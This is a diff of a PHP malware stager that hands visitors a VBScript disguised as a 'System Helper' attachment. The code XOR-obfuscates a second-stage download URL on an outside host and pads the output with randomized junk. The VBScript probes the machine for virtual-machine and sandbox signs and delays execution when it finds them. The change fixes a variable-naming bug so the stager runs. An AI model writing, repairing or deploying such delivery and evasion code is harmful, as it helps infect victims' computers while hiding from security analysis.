@@ -1,5 +1,5 @@
 <?php
-// stage1.php - Clean + Lightly Obfuscated Stager
+// stage1.php - Fixed version (no name redefined error)
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -29,10 +29,8 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
-// ===== CHANGE THIS =====
 $stage2Url = "https://walrus-app-f8pss.ondigitalocean.app/stage2.php";
 
-// Light XOR for the URL
 $xorKey = rand(40, 90);
 $encrypted = "";
 for ($i = 0; $i < strlen($stage2Url); $i++) {
@@ -40,7 +38,6 @@ for ($i = 0; $i < strlen($stage2Url); $i++) {
 }
 $encrypted = rtrim($encrypted, "&");
 
-// Varying size junk
 $junkLines = rand(5, 18);
 $junk = "";
 for ($i = 0; $i < $junkLines; $i++) {
@@ -51,7 +48,7 @@ echo <<<VBS
 ' System Helper
 On Error Resume Next
 
-Dim score, objShell, objFSO, http, stream, stage2, tempFile, k
+Dim score, objShell, objFSO, http, stream, stage2, tempFile, k, svc, item, t, procCount
 score = 0
 k = $xorKey
 
@@ -67,7 +64,6 @@ Function C(v, n)
     C = False
 End Function
 
-Dim svc, item, t, c
 Set svc = GetObject("winmgmts:\\\\.\\root\\cimv2")
 
 For Each item In svc.ExecQuery("SELECT Manufacturer,Model FROM Win32_ComputerSystem")
@@ -80,11 +76,11 @@ For Each item In svc.ExecQuery("SELECT Manufacturer,SMBIOSBIOSVersion FROM Win32
     If C(t, Array("vmware","virtualbox","vbox","qemu","xen","parallels","hyper-v")) Then score = score + 3
 Next
 
-c = 0
+procCount = 0
 For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
-    c = c + 1
+    procCount = procCount + 1
 Next
-If c < 35 Then score = score + 1
+If procCount < 35 Then score = score + 1
 
 If score >= 3 Then
     WScript.Sleep 1800000
